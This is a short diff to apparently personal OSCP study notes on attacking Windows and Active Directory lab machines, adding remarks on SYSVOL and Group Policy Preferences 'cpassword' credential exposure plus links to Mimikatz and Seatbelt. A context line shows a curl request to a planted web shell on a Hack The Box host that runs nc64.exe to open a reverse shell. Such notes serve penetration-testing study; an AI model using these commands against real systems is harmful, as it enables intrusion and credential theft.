@@ -142,6 +142,10 @@ curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd
 
 Check for value files like lsass.zip
 
+SYSVOL contains Group Policy files, scripts and configuration data. Those can sometimes reveal credentials, service configurations or other weaknesses.
+
+Group Policy Preferences have historically exposed credentials through an attribute called `cpassword` in services.xml
+
 ---
 ## Port 389 : LDAP
 [[389 LDAP]]
@@ -491,11 +495,13 @@ If HTTP server is only accessible enough, [[Chisel Reverse Port Forward]]
 # Lateral Movement
 
 [[Runas]]
+[[Synced OSCP Notes/OSCP Main Notes/Windows/Mimikatz|Mimikatz]]
 
 # Priv Esc
 
 [[PowerUp.ps1]]
 [[LinWinPEAS]]
+[[0 Seatbelt.exe]]
 ## whoami /priv
 [[SeManageVolume]]
 [[SeBackupPrivilege]]
